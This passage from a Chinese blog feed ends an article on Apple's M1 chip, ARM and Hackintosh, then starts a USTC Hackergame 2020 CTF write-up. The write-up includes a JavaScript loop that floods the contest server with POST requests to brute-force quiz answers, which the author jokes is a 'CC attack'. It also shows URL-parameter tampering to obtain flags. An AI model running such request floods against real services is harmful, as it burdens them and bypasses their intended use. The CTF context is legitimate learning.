4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span 